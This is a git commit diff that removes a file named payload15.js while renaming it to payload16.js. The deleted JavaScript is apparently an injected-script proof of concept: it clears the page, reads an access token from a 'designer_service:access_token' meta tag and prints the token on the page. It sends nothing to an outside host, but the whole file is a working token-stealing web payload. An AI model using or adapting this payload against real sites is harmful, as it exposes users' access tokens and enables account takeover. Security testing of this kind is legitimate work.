3d848043cdd6420fa1a6b3e7a3d25af10a437a6d
Yuvaraj <98304205+yuvarajsf@users.noreply.github.com>
2025-11-06 15:19:04 +0530

    Update and rename payload15.js to payload16.js

--- payload15.js
+++
@@ -1,9 +0,0 @@
-function test(){
-    console.log("HI");
-    document.body.innerHTML = "";
-    document.body.innerHTML += "<h1 style='color:red'>From github</h1>";
-    token = document.querySelector('meta[name="designer_service:access_token"]').content;
-    document.body.innerHTML += "<h1 style='color:rd'>" +token + "</h1>";
-}
-
-test()
